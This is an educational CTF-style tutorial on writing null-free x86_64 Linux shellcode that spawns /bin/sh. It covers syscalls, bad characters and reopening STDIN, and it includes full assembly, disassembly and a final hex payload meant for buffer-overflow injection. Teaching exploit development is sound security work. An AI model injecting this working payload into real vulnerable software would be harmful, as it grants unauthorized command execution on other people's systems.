<h1 align="center">PWN 101</h1>
  <p align="center">
  Basic Shellcoding
  </p>

### Table of contents

- [Introduction](#introduction)
- [System Calls](#system-calls)
- [Basic Shell](#basic-shell)
- [Bad Characters](#bad-characters)
- [Removing NULLs](#removing-nulls)
- [Manipulating STDIN](#manipulating-stdin)
- [Final Shell](#final-shell)
- [Practice](#practice)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

Usually (but not always), when we exploit a target, we want to have the ability to execute any commands on that target. Typically, this means that we need to be able to obtain a shell prompt on the target, which will allow us to type in commands and achieve whatever goal we're trying to achieve as the attackers. On Linux systems, the `/bin/sh` file is used to give us a shell prompt, so if our goal is to execute commands on the target, then we would like to have the ability to execute the `/bin/sh` file.

Most programmers do not want you to be exploiting their software, which is why most of the time you will not have easy access to a function that executes `system(/bin/sh)` for you when writing an exploit. For this reason, it is necessary for us to write our own code in assembly that executes `system(/bin/sh)`. The assembled code is known as our "shellcode" or our "payload." Once we create our shellcode, we will be able to "inject" it into a program using a vulnerability such as a buffer overflow. The shellcode will then be executed after its injected.

We will go over exactly how you do this code injection when we go over buffer overflows, but, for now, we need to first create the code that we want to have executed in the first place. The act of creating the shellcode itself is known as "shellcoding." Shellcode can, in theory, do whatever you program it to do, but this tutorial specifically focuses on creating shellcode that executes `system("/bin/sh")` for us. This way, when the shellcode is injected into another process, we will have the ability to type in whatever commands we want.

Don't worry if you've read over this once and still don't completely understand shellcoding; it will gradually become clearer over time. If you're having trouble with understanding this topic, then just note down the final shellcode shown at the end, move to the next course, and reread this one after attempting to do a buffer overflow while injecting shellcode.

Note that this tutorial is specific for Linux machines. Creating shellcode on Windows machines is a little bit more complicated, which is why we are just going to focus on Linux for now. Also note that we will be writing shellcode using the x86_64 instruction set in intel syntax.

## System Calls

In assembly, we are able to call special functions that are known as "system calls" or "syscalls." Whenever a syscall command is executed, the operating system will issue something called a system interrupt, which essentially allows the kernel to take over and do some task. The task that is being completed depends on what number `rax` is set equal to. You can think of syscalls as a low-level API that user applications use in order to access certain kernel functions.

For example, `sys_exit()` has a system call number of 60. If you wanted to exit a program in assembly, you would have to set `rax` equal to 60 before using the `syscall` command. You can read more about syscalls [here](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm) (note that this tutorial is for 32-bit assembly and will have different system call numbers, but the general idea remains the same in 64-bit assembly).

A list of all Linux x86_64 system calls can be found [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/). You can ignore most of these, but the syscalls that we care about the most are:
- System call #2: `sys_open(const char *filename, int flags, int mode)` - Opens a file.
- System call #3: `sys_close(unsigned int fd)` - Closes a file.
- System call #59: `sys_execve(const char *filename, const char *const argv[], const char *const envp[])` - Executes a file.

If a system calls requires arguments, then you can set those arguments using the [x86_64 calling convention](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf). The calling convention states that you can pass up to six arguments into the following registers: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`. If there are any more arguments, then you can push the rest of them onto the stack in reverse order. For example, if you wanted to make a call to `sys_execve()`, you would set the following registers:
- `rax` is set to 59
- `rdi` is set to a pointer to a string containing the file name
- `rsi` is set to a pointer to an array of strings containing the arguments (can also be NULL)
- `rdx` is set to a pointer to an array of strings containing the environment variables (can also be NULL)

## Basic Shell

Let's write some code to call "/bin/sh" for us. The [Netwide Assembler (NASM)](https://nasm.us/) is used below when assembling the code, but you can also use any other assembler that can get the job done.

```
section .text ; Indicates that this is the text section
global _start ; Begins execution at _start label
_start:

mov rax, 59 ; Syscall for execve
mov rbx, 0 ; Sets rbx to NULL
push rbx ; Pushes a string terminator onto the stack
mov rbx, 0x68732f6e69622f ; Moves "/bin/sh" (wrtten in ASCII) to rbx
push rbx ; Pushes "/bin/sh" onto the stack
mov rdi, rsp ; Get a pointer to "/bin/sh" in RDI
mov rsi, 0 ; Sets rsi to NULL
mov rdx, 0 ; Sets rdx to NULL
syscall ; Does the actual system interrupt
```

In this code, we first store 59 into `rax`. Then we get a pointer to "/bin/sh" by pushing its ASCII equivalent onto the stack and moving the stack pointer into `rdi`. Both `rsi` and `rdx` are set to NULL before the syscall is executed. Assuming that NASM is installed, the code can be assembled and executed using the below commands:

```sh
$ nasm -f elf64 -o basic_shell.o basic_shell.asm

$ ld -o basic_shell basic_shell.o

$ ./basic_shell
$ ls
README.md  basic_shell  basic_shell.asm  basic_shell.o
$ whoami
nihaal
$ echo 1
1
$
```

As you can see, our shellcode has given us a working shell. We can use [objdump](https://linux.die.net/man/1/objdump) to view our code and its corresponding hexadecimal byte values.

```sh
$ objdump -D basic_shell -M intel

basic_shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       b8 3b 00 00 00          mov    eax,0x3b
  401005:       bb 00 00 00 00          mov    ebx,0x0
  40100a:       53                      push   rbx
  40100b:       48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
  401012:       73 68 00
  401015:       53                      push   rbx
  401016:       48 89 e7                mov    rdi,rsp
  401019:       be 00 00 00 00          mov    esi,0x0
  40101e:       ba 00 00 00 00          mov    edx,0x0
  401023:       0f 05                   syscall
```

In order to extract the shellcode itself, we need to only print out the hexadecimal bytes themselves. There is a quick trick that we can use in order to do this.
```sh
$ for i in $(objdump -m i386:x86-64 -D basic_shell |grep "^ " |cut -f2); do printf $i; done; echo
b83b000000bb000000005348bb2f62696e2f736800534889e7be00000000ba000000000f05
```

Note that this trick usually only works for 64-bit machines. If you're trying to create 32-bit shellcode, you'll have more luck with this command instead: `for i in $(objdump -d [program] |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo`

## Bad Characters

We have figured out that using `b83b000000bb000000005348bb2f62696e2f736800534889e7be00000000ba000000000f05` as our shellcode will give us a shell. However, there is a slight problem here: the payload contains lots of `00` bytes. If we attempted to inject this into a vulnerable C program, then it is quite likely that the payload gets cut off after the first `00` byte appears because C interprets these NULL characters as string terminators.

These `00` characters are an example of something exploit developers refer to as badchars. Badchars are basically hex values that should not appear in our shellcode because they cause the target program to behave differently. NULLs may not be the only badchar in a target program; they are just the most common. For example, if you were targetting a networking application that used 0x09 (tab) to indicate the end of a message, then 0x09 would also be a badchar that you would avoid using in your shellcode.

Whenever you have characters that cause the target program to behave in a special way, you should treat those characters as badchars and avoid using them in your shellcode. Here, we will go over a method you can use in order to remove NULL characters from your shellcode.

## Removing NULLs

```
b8 3b 00 00 00          mov    eax,0x3b
bb 00 00 00 00          mov    ebx,0x0
53                      push   rbx
48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
73 68 00
53                      push   rbx
48 89 e7                mov    rdi,rsp
be 00 00 00 00          mov    esi,0x0
ba 00 00 00 00          mov    edx,0x0
0f 05                   syscall
```

In order to remove the `00` values, we have to first figure out what causes them. When we look at the object dump (shown above), we can see that there are two main reasons why our shellcode contains NULLs:
1. Doing `mov` commands with zeros in the input will lead to zeros in the shellcode.
2. Doing `mov` commands without enough "space" in the input will cause zeros to be automatically appended at the end.

To get around the first issue, we can just use `xor reg, reg` instead of `mov reg, 0`. XORing something with itself will always result in zero. Getting around the second issue will take more steps. We'll first have to zero out the register by using `xor reg, reg`, and then we'll have to move the amount that we want into a smaller register (i.e. use `al` or something instead of `rax`). Another thing that we can do is we can move the high end bits into a smaller register, shift the register left, and move the low end bits into the smaller register.

When we do all of these things, we end up with the following assembly code:
```
section .text ; Text section for code
global _start ; Begins execution at _start
_start:

; Get 59 in rax 
xor rax, rax ; Clear the rax register
mov al, 59 ; Syscall for execve

; Push a string terminator onto the stack
xor rbx, rbx ; Sets rbx to NULL
push rbx ; Pushes a NULL byte onto the stack

; Push /bin/sh onto the stack, and get a pointer to it in rdi
mov ebx, 0x68732f6e ; Moves "n/sh" (written backwards in ASCII) into lower-end bits of rbx
shl rbx, 16 ; Pushes "n/sh" to the left to make more room for 2 more bytes in rbx
mov bx, 0x6962 ; Move "bi" into lower-end bits of rbx. rbx is now equal to "bin/sh" written backwards
shl rbx, 16 ; Makes 2 extra bytes of room in rbx
mov bh, 0x2f ; "Moves /" into rbx. rbx is now equal to "\x00/bin/sh" written backwards
             ; Note that we are moving 0x2f into bh, not bl. So there is a NULL byte at the beginning
push rbx ; Push the string onto the stack
mov rdi, rsp ; Get a pointer to the string "\x00/bin/sh" in rdi
add rdi, 1 ; Add one to rdi, which will get rid of the NULL byte at the beginning.
           ; rdi now points to a string that equals "/bin/sh"

; Make these values NULL
xor rsi, rsi
xor rdx, rdx

; Call execve()
syscall
```

When we run the program, it does the same thing and gives us a shell prompt.
```sh
$ nasm -f elf64 -o better_shell.o better_shell.asm

$ ld -o better_shell better_shell.o

$ ./better_shell
$ ls
README.md  basic_shell  basic_shell.asm  basic_shell.o  better_shell  better_shell.asm  better_shell.o
$
```

However, now our shellcode does not contain any NULL values.
```sh
$ objdump -D better_shell -M intel

better_shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 31 c0                xor    rax,rax
  401003:       b0 3b                   mov    al,0x3b
  401005:       48 31 db                xor    rbx,rbx
  401008:       53                      push   rbx
  401009:       bb 6e 2f 73 68          mov    ebx,0x68732f6e
  40100e:       48 c1 e3 10             shl    rbx,0x10
  401012:       66 bb 62 69             mov    bx,0x6962
  401016:       48 c1 e3 10             shl    rbx,0x10
  40101a:       b7 2f                   mov    bh,0x2f
  40101c:       53                      push   rbx
  40101d:       48 89 e7                mov    rdi,rsp
  401020:       48 83 c7 01             add    rdi,0x1
  401024:       48 31 f6                xor    rsi,rsi
  401027:       48 31 d2                xor    rdx,rdx
  40102a:       0f 05                   syscall

$ for i in $(objdump -m i386:x86-64 -D better_shell |grep "^ " |cut -f2); do printf $i; done; echo
4831c0b03b4831db53bb6e2f736848c1e31066bb626948c1e310b72f534889e74883c7014831f64831d20f05
```

This is some solid shellcode, but we can make it even better.

## Manipulating STDIN

One thing that we may find useful while developing exploits is the input redirection command (<). The input redirection command is typically used like this: `./command < file`. It works by changing the value of `STDIN` to another file so that user input comes from the specified file instead of the command line. Later, we may find it useful to use the input redirection command because it makes handling user input easier. If you would like to learn more about how redirection works in Linux, click [here](https://linuxhandbook.com/redirection-linux/).

If we try using the input redirection command on a vulnerable program that contains our injected shellcode, then when `execve("/bin/sh", NULL, NULL)` is executed, the program may try reading our commands from a file instead of reading commands from the terminal window. We need to write some extra assembly that closes whatever the current input file is and reopens `STDIN`, which will ensure that the input is always read directly from the keyboard.

We can do this by first calling `sys_close(STDIN)` and calling `open("/dev/tty", O_RDWR | ...)` afterwards. This will close and reopen `STDIN`, which will refresh it and let us type in keyboard input. Note that "/dev/tty" is a Linux alias for the device that handles `STDIN` by default.

Closing `STDIN` is simple. We just need to set the following registers for the syscall:
- `rax` is set to 3, which is the syscall for `sys_close`
- `rdi` is set to 0, which represents `STDIN`

```
xor rax, rax ; Clears the rax register
xor rdi, rdi ; Zero represents STDIN
mov al, 3 ; Syscall number for sys_close
syscall ; Calls sys_close(0)
```

Opening "/dev/tty" is a little bit more complicated. First we need to push a string terminator onto the stack. Since `rax` is set equal to zero at this point in time, we can just push `rax`. Next, we should move a pointer to the ASCII string "/dev/tty" into `rdi`. We can do this by pushing its hexadecimal equivalent onto the stack and moving `rsp` into `rdi` (similar to what we did to get a pointer to "/bin/sh" into `rdi` earlier). We don't have to move this string in chunks like last time because "/dev/tty" is eight bytes long, which is also the exact size of `rdi`. We'll set the flag value in `rsi` to 0x2702 for read and write mode. Finally, we can move syscall number 2 into `rax` and run the syscall.

```
push rax ; Push a string terminator onto the stack
mov rdi, 0x7974742f7665642f ; Move "/dev/tty" (written backwards in ASCII) into rdi.
push rdi ; Push the string "/dev/tty" onto the stack.
push rsp ; Push a pointer to the string onto the stack.
pop rdi ; rdi now has a pointer to the string "/dev/tty"
        ; These last two lines are equivalent to doing "mov rdi, rsp"
push rax ; Push a NULL byte onto the stack
pop rsi ; Make rsi NULL
        ; These last two lines are equivalent to doing "mov rsi, 0"
mov si, 0x2702 ; Flag for O_RDWR
mov al, 0x2 ; Syscall for sys_open
syscall ; calls sys_open("/dev/tty", O_RDWR)
```

## Final Shell

When we put everything all together, we get the following assembly code:

```
section .text ; Text section for code
global _start ; Begins execution at _start
_start:

; Close STDIN
xor rax, rax ; Clears the rax register
xor rdi, rdi ; Zero represents STDIN
mov al, 3 ; Syscall number for sys_close
syscall ; Calls sys_close(0)

; Opening "/dev/tty"
push rax ; Push a string terminator onto the stack
mov rdi, 0x7974742f7665642f ; Move "/dev/tty" (written backwards in ASCII) into rdi.
push rdi ; Push the string "/dev/tty" onto the stack.
push rsp ; Push a pointer to the string onto the stack.
pop rdi ; rdi now has a pointer to the string "/dev/tty"
        ; These last two lines are equivalent to doing "mov rdi, rsp"
push rax ; Push a NULL byte onto the stack
pop rsi ; Make rsi NULL
        ; These last two lines are equivalent to doing "mov rsi, 0"
mov si, 0x2702 ; Flag for O_RDWR
mov al, 0x2 ; Syscall for sys_open
syscall ; calls sys_open("/dev/tty", O_RDWR)

; Get 59 in rax
xor rax, rax ; Clear the rax register
mov al, 59 ; Syscall for execve

; Push a string terminator onto the stack
xor rbx, rbx ; Sets rbx to NULL
push rbx ; Pushes a NULL byte onto the stack

; Push /bin/sh onto the stack, and get a pointer to it in rdi
mov ebx, 0x68732f6e ; Moves "n/sh" (written backwards in ASCII) into lower-end bits of rbx
shl rbx, 16 ; Pushes "n/sh" to the left to make more room for 2 more bytes in rbx
mov bx, 0x6962 ; Move "bi" into lower-end bits of rbx. rbx is now equal to "bin/sh" written backwards
shl rbx, 16 ; Makes 2 extra bytes of room in rbx
mov bh, 0x2f ; "Moves /" into rbx. rbx is now equal to "\x00/bin/sh" written backwards
             ; Note that we are moving 0x2f into bh, not bl. So there is a NULL byte at the beginning
push rbx ; Push the string onto the stack
mov rdi, rsp ; Get a pointer to the string "\x00/bin/sh" in rdi
add rdi, 1 ; Add one to rdi, which will get rid of the NULL byte at the beginning.
           ; rdi now points to a string that equals "/bin/sh"

; Make these values NULL
xor rsi, rsi
xor rdx, rdx

; Call execve()
syscall
```

We should continue to get a shell when we assemble and run this code.

```
$ nasm -f elf64 -o final_shell.o final_shell.asm

$ ld -o final_shell final_shell.o

$ objdump -D final_shell -M intel

final_shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       48 31 c0                xor    rax,rax
  401003:       48 31 ff                xor    rdi,rdi
  401006:       b0 03                   mov    al,0x3
  401008:       0f 05                   syscall
  40100a:       50                      push   rax
  40100b:       48 bf 2f 64 65 76 2f    movabs rdi,0x7974742f7665642f
  401012:       74 74 79
  401015:       57                      push   rdi
  401016:       54                      push   rsp
  401017:       5f                      pop    rdi
  401018:       50                      push   rax
  401019:       5e                      pop    rsi
  40101a:       66 be 02 27             mov    si,0x2702
  40101e:       b0 02                   mov    al,0x2
  401020:       0f 05                   syscall
  401022:       48 31 c0                xor    rax,rax
  401025:       b0 3b                   mov    al,0x3b
  401027:       48 31 db                xor    rbx,rbx
  40102a:       53                      push   rbx
  40102b:       bb 6e 2f 73 68          mov    ebx,0x68732f6e
  401030:       48 c1 e3 10             shl    rbx,0x10
  401034:       66 bb 62 69             mov    bx,0x6962
  401038:       48 c1 e3 10             shl    rbx,0x10
  40103c:       b7 2f                   mov    bh,0x2f
  40103e:       53                      push   rbx
  40103f:       48 89 e7                mov    rdi,rsp
  401042:       48 83 c7 01             add    rdi,0x1
  401046:       48 31 f6                xor    rsi,rsi
  401049:       48 31 d2                xor    rdx,rdx
  40104c:       0f 05                   syscall

$ ./final_shell
$ ls
README.md    basic_shell.asm  better_shell      better_shell.o  final_shell.asm
basic_shell  basic_shell.o    better_shell.asm  final_shell     final_shell.o
$
```

Here is our final shellcode. Take a note of this string; you'll need to use this later.

```
$ for i in $(objdump -m i386:x86-64 -D final_shell |grep "^ " |cut -f2); do printf $i; done; echo
4831c04831ffb0030f055048bf2f6465762f74747957545f505e66be0227b0020f054831c0b03b4831db53bb6e2f736848c1e31066bb626948c1e310b72f534889e74883c7014831f64831d20f05
```

## Practice:
- TODO: Get a TCTF challenge here.

## More Resources:
- [Assembly Programming Tutorials](https://www.tutorialspoint.com/assembly_programming/index.htm)
- [Assembly System Calls (32-bit)](https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm)
- [System Call Table (64-bit)](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [Netwide Assembler (NASM)](https://nasm.us/)
- [Input, Output, and Error Redirection in Linux](https://linuxhandbook.com/redirection-linux/)

## Creators

**Nihaal Prasad**

Enjoy :metal:
